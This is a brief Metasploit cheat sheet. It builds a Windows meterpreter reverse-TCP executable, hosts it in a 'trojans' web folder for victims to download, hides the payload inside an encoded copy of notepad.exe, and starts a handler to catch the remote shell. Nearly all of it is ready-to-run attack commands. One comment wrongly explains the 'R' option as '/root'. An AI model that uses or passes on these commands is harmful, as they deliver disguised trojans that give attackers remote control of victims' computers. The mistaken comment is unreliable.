msfpayload cheat scripts

run in regular shell not in msfconsole

$ msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.100 X > reverse_tcp.exe
# LHOST is the attacker
# X > reverse_tcp.exe; executable is being created

load executable on web server

# open new terminal
$ apache2ctl restart
$ mkdir /var/www/trojans
$ cp reverse_tcp.exe /var/www/trojans

run exploit in msfconsole
$ use exploit/multi/handler
$ set PAYLOAD windows/meterpreter/reverse_tcp
$ set LHOST 192.168.1.100
$ exploit

victim needs to visit 192.168.1.100


Encoding existing executable 
$ msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 R | msfencode -t exe -x /root/Desktop/notepad.exe -c 10 -o notepad.exe 
# -c wll encode 10 times 
# -o is the output file
# R |  is /root
$ cp notepad.exe /var/www/trojans

use msfconsole to start the payload handler
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> exploit















